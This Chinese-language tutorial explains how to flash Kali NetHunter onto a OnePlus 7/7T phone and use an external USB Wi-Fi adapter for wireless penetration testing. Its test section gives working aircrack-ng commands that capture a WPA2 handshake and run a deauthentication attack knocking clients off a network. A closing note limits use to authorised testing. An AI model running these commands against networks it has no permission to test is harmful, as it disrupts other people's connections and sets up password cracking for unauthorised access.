## 📶 2. 网卡问题：内置 vs 外接

### Q：一加的内置网卡支持监听模式吗？

### A：别指望内置网卡！

```
┌─────────────────────────────────────────┐
│ 内置网卡（高通 WCN 系列）                │
├─────────────────────────────────────────┤
│ 设计目的：通信，不是攻击                │
│ 监听模式：⚠️ 部分内核可强行开启         │
│ 包注入：❌ 不支持                       │
│ 稳定性：❌ 极易崩溃                     │
│ 信号：❌ 弱，稍远就抓不到               │
└─────────────────────────────────────────┘
```

**技术限制：**
- 即使定制内核开启 Monitor Mode
- 通常不支持 **Packet Injection（包注入）**
- 无法进行 Deauth 攻击（踢人下线）
- 无法抓取握手包

**结论：**
```
内置网卡 = 只能上网
         或极近距离蓝牙嗅探
         
外接网卡 = 真正的 WiFi 渗透
```

## 🔧 5. 安装与配置

### 第 1 步：解锁 Bootloader

```bash
# 1. 官网申请解锁码
https://www.oneplus.com/cn/support/unlock

# 2. 手机开启开发者选项
设置 → 关于手机 → 连续点击"版本号"7 次

# 3. 开启 OEM 解锁
设置 → 开发者选项 → OEM 解锁 ✅

# 4. 电脑连接手机
fastboot oem unlock

# 5. 手机确认 → 30 秒搞定！
```

### 第 2 步：刷入 NetHunter

```bash
# 1. 下载 NetHunter 镜像
https://www.kali.org/docs/nhunter/nhunter-devices/
选择 OnePlus 7/7T 对应版本

# 2. 刷入 TWRP Recovery
fastboot flash recovery twrp.img

# 3. 进入 Recovery
音量下 + 电源键

# 4. 刷入 NetHunter 镜像
Install → 选择 zip → 滑动确认

# 5. 重启 → 完成！
```

### 第 3 步：安装 NetHunter App

```
1. 下载 NetHunter Store APK
2. 安装应用
3. 打开 → 授予 Root 权限
4. 配置完成
```

### 第 4 步：连接外接网卡

```
1. 插入 OTG 转接头
2. 插入 USB 网卡
3. 打开 NetHunter 终端
4. 运行命令验证
```

### 第 5 步：验证监听模式

```bash
# 查看网卡
ifconfig -a

# 应该看到 wlan0（内置）和 wlan1（外接）

# 开启监听模式
airmon-ng start wlan1

# 看到 "monitor mode enabled" → 成功！✅

# 扫描 WiFi
airodump-ng wlan1mon
```

## 🎯 6. 实战测试

### 测试 1：扫描 WiFi

```bash
# 扫描周围 WiFi
airodump-ng wlan1mon

# 输出示例：
CH  6 ][ Elapsed: 0 s ][ 2026-02-23 14:00
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -45       10        0    0   6  54e  WPA2 CCMP   PSK  HomeWiFi
```

### 测试 2：抓握手包

```bash
# 抓指定 AP 的握手包
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon

# 踢人攻击（强制重连）
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan1mon

# 看到 "WPA Handshake: AA:BB:CC:DD:EE:FF" → 成功！
```


## ⚠️ 7. 注意事项

### 供电问题

```
⚠️ 大功率网卡（如 RTL8812AU）耗电快
→ 必须用 Y 型线 + 充电宝
→ 否则手机可能断电关机
```

### 发热问题

```
⚠️ 长时间运行会发热
→ 避免阳光直射
→ 适当休息
```

### 法律问题

```
⚠️ 仅限学习和授权测试
→ 破解自己家网络 = ✅ 合法
→ 破解他人网络 = ❌ 违法
→ 遵守《网络安全法》
```

### 保养建议

```
✅ 不用时拔掉网卡
✅ 定期清理手机缓存
✅ 备份重要数据
✅ 避免频繁刷机
```
